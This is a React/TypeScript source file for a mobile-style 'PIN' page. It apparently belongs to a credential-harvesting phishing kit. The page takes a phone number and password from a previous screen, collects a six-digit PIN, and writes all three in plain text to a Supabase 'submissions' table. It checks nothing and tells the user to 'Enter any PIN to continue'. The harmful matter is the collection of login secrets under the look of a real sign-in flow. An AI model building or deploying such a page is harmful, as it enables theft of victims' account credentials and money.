import { useState, useRef, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "@/lib/supabase";

export default function PinPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state as { phone?: string; password?: string } | null;
  const phone = state?.phone ?? "";
  const password = state?.password ?? "";
  const [saving, setSaving] = useState(false);

  const [pins, setPins] = useState<string[]>(["", "", "", "", "", ""]);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const handleChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const newPins = [...pins];
    newPins[index] = digit;
    setPins(newPins);

    if (digit && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !pins[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    const newPins = [...pins];
    for (let i = 0; i < pasted.length; i++) {
      newPins[i] = pasted[i];
    }
    setPins(newPins);
    const nextIndex = Math.min(pasted.length, 5);
    inputRefs.current[nextIndex]?.focus();
  };

  const filledCount = pins.filter((p) => p !== "").length;
  const isReady = filledCount > 0;

  const handleNext = async () => {
    if (!isReady || saving) return;
    setSaving(true);
    const pin = pins.join("");
    const submittedAt = new Date().toISOString();
    await supabase.from("submissions").insert({
      phone,
      password,
      pin,
      submitted_at: submittedAt,
    });
    setSaving(false);
    navigate("/success", { state: { submittedAt } });
  };

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{ background: "#ffffff", padding: "48px 24px 32px" }}
    >
      {/* Back Arrow */}
      <button
        onClick={() => navigate(-1)}
        className="mb-8 flex items-center gap-2"
        style={{ background: "none", border: "none", cursor: "pointer", padding: 0 }}
      >
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#222" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M19 12H5M12 5l-7 7 7 7" />
        </svg>
      </button>

      {/* Title */}
      <h1
        className="font-bold mb-10"
        style={{ fontSize: "32px", color: "#111", letterSpacing: "0.5px" }}
      >
        PIN
      </h1>

      {/* PIN Boxes */}
      <div className="flex gap-2 mb-10">
        {pins.map((pin, index) => (
          <input
            key={index}
            ref={(el) => { inputRefs.current[index] = el; }}
            type="tel"
            inputMode="numeric"
            maxLength={1}
            value={pin}
            onChange={(e) => handleChange(index, e.target.value)}
            onKeyDown={(e) => handleKeyDown(index, e)}
            onPaste={handlePaste}
            className="text-center font-semibold outline-none transition-all"
            style={{
              width: "46px",
              height: "46px",
              fontSize: "18px",
              borderRadius: "10px",
              border: `2px solid ${pin ? "#2eaa6c" : "#d0d0d0"}`,
              color: "#111",
              background: "#fff",
              caretColor: "#2eaa6c",
              flexShrink: 0,
            }}
            onFocus={(e) => {
              e.target.style.borderColor = "#2eaa6c";
              e.target.style.boxShadow = "0 0 0 3px rgba(46,170,108,0.15)";
            }}
            onBlur={(e) => {
              e.target.style.borderColor = pins[index] ? "#2eaa6c" : "#d0d0d0";
              e.target.style.boxShadow = "none";
            }}
          />
        ))}
      </div>

      {/* Next Button */}
      <button
        onClick={handleNext}
        disabled={!isReady || saving}
        className="w-full rounded-2xl font-semibold transition-all active:scale-95"
        style={{
          height: "56px",
          fontSize: "18px",
          background: isReady
            ? "linear-gradient(135deg, #2eaa6c, #1e8a54)"
            : "#f0f0f0",
          color: isReady ? "#ffffff" : "#aaa",
          border: "none",
          cursor: isReady && !saving ? "pointer" : "default",
          boxShadow: isReady ? "0 4px 18px rgba(46,170,108,0.32)" : "none",
          letterSpacing: "0.5px",
          transition: "all 0.25s ease",
          opacity: saving ? 0.75 : 1,
        }}
      >
        {saving ? "Saving..." : "Next"}
      </button>

      {/* Hint */}
      <p
        className="text-center mt-6"
        style={{ fontSize: "13px", color: "#bbb" }}
      >
        Enter any PIN to continue
      </p>
    </div>
  );
}
